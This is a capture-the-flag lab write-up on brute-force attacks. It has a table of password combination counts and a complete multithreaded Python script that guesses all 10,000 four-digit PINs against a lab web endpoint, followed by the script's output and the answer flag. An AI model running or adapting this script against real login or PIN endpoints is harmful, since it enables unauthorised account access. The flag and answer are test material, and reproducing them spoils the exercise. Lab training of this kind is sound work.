# Brute Force Attacks

```
Possible Combinations = Character Set Size^Password Length
```

<table class="bg-neutral-800 text-primary w-full"><thead class="text-left rounded-t-lg"><tr class="border-t-neutral-600 first:border-t-0 border-t"><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4"></th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Password Length</th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Character Set</th><th class="bg-neutral-700 first:rounded-tl-lg last:rounded-tr-lg p-4">Possible Combinations</th></tr></thead><tbody class="font-mono text-sm"><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Short and Simple</code></td><td class="p-4">6</td><td class="p-4">Lowercase letters (a-z)</td><td class="p-4">26^6 = 308,915,776</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Longer but Still Simple</code></td><td class="p-4">8</td><td class="p-4">Lowercase letters (a-z)</td><td class="p-4">26^8 = 208,827,064,576</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Adding Complexity</code></td><td class="p-4">8</td><td class="p-4">Lowercase and uppercase letters (a-z, A-Z)</td><td class="p-4">52^8 = 53,459,728,531,456</td></tr><tr class="border-t-neutral-600 first:border-t-0 border-t"><td class="p-4"><code class="bg-neutral-700 mb-6 text-blue-250 py-1 px-1.5">Maximum Complexity</code></td><td class="p-4">12</td><td class="p-4">Lowercase and uppercase letters, numbers, and symbols</td><td class="p-4">94^12 = 475,920,493,781,698,549,504</td></tr></tbody></table>

## Questions
1. After successfully brute-forcing the PIN, what is the full flag the script returns? **Answer: HTB{Brut3_F0rc3_1s_P0w3rfu1}**
   - Use this multi thread script to brute force the PIN:
        ```sh
        $ cat pin-solver-v2.py 
        import requests
        from concurrent.futures import ThreadPoolExecutor, as_completed

        # Configuration
        IP = "154.57.164.68"
        PORT = 31628
        THREADS = 50  # Adjust based on server stability and your bandwidth

        # Variable to track if we found the flag so we can stop other threads
        found_flag = False

        def attempt_pin(pin):
            global found_flag
            if found_flag:
                return None

            formatted_pin = f"{pin:04d}"
            url = f"http://{IP}:{PORT}/pin?pin={formatted_pin}"
            
            try:
                response = requests.get(url, timeout=5)
                
                if response.ok:
                    data = response.json()
                    if 'flag' in data:
                        found_flag = True
                        return f"Correct PIN found: {formatted_pin} | Flag: {data['flag']}"
            except Exception as e:
                return f"Error with PIN {formatted_pin}: {e}"
            
            return None

        def main():
            print(f"Starting brute force with {THREADS} threads...")
            
            # Generate PINs 0000-9999
            pins = range(10000)

            with ThreadPoolExecutor(max_workers=THREADS) as executor:
                # Submit all tasks to the thread pool
                future_to_pin = {executor.submit(attempt_pin, p): p for p in pins}

                for future in as_completed(future_to_pin):
                    result = future.result()
                    if result:
                        print(result)
                        # Shutdown the executor once the flag is found
                        executor.shutdown(wait=False, cancel_futures=True)
                        break

        if __name__ == "__main__":
            main()
        ```
   - Run the script and obtain the flag:
        ```sh
        $ python pin-solver-v2.py 
        Starting brute force with 50 threads...
        Correct PIN found: 8940 | Flag: HTB{Brut3_F0rc3_1s_P0w3rfu1}
        ```